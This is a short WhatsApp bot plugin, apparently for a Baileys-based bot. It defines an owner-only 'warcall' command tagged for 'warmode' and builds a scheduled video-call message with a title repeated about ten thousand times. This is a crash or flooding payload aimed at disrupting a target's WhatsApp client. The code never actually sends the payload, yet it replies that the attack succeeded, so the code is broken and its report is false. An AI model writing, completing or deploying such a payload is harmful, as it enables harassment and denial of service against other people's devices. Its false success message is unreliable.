let handler = async (m, {conn, text}) => {
if (!text) throw `masukan Id grup`
const a = {
scheduledCallCreationMessage: {
callType: "VIDEO",
scheduledTimestampMs:  Date.now(),
title: "🦊 PUH SEPUH 🦊\n".repeat(99*99)
}
}
conn.sendMessage(m.chat, {
          react: {
            text: `☑`,
            key: m.key,
          }})
m.reply('Sukses mengirim warcall ke nomor tujuan')
}
handler.help = ['warcall *(ᴏᴡɴᴇʀ ᴏɴʟʏ)*']
handler.tags = ['owner','warmode']
handler.command = /^(warcall|zerocall)$/i
handler.rowner = true
export default handler